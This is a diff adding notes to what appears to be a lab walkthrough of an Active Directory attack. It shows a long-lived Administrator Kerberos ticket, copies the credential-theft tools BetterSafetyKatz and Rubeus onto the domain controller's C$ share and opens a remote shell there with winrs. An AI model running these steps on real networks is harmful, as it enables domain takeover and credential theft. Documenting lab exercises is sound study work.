@@ -180,6 +180,81 @@ Supplemental Credentials:
 
 ```
 ## Accesss eushare on euvendor dc
+Review chaed tickets:
+``
+C:\Windows\system32>klist
+
+Current LogonId is 0:0x738a20d
+
+Cached Tickets: (2)
+
+#0>     Client: Administrator @ eu.local
+        Server: krbtgt/eu.local @ eu.local
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+        Start Time: 3/3/2023 11:37:46 (local)
+        End Time:   2/28/2033 11:37:46 (local)
+        Renew Time: 2/28/2033 11:37:46 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+#1>     Client: Administrator @ eu.local
+        Server: ldap/EU-DC.eu.local @ EU.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 3/3/2023 11:37:51 (local)
+        End Time:   3/3/2023 21:37:51 (local)
+        Renew Time: 3/10/2023 11:37:51 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: EU-DC.eu.local
+``
+Copy binaries to eu-dc.eu.local:
+
+```
+C:\Windows\system32>echo F | xcopy C:\AD\Tools\BetterSafetyKatz.exe \\eu-dc.eu.local\C$\Users\Public\BetterSafetyKatz.exe /Y
+Does \\eu-dc.eu.local\C$\Users\Public\BetterSafetyKatz.exe specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\AD\Tools\BetterSafetyKatz.exe
+1 File(s) copied
+
+C:\Windows\system32>echo F | xcopy C:\AD\Tools\Rubeus.exe \\eu-dc.eu.local\C$\Users\Public\Rubeus.exe /Y
+Does \\eu-dc.eu.local\C$\Users\Public\Rubeus.exe specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\AD\Tools\Rubeus.exe
+1 File(s) copied
+
+```
+Accesss to eu-dc.eu.local:
+
+```
+C:\Windows\system32>winrs -r:eu-dc.eu.local cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>hostname
+hostname
+EU-DC
+
+C:\Users\Administrator>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::f7f9:b2b9:5130:1891%3
+   IPv4 Address. . . . . . . . . . . : 192.168.12.1
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.12.254
+
+
+```
 
 
 ## Access euvendor net using powershell remoting
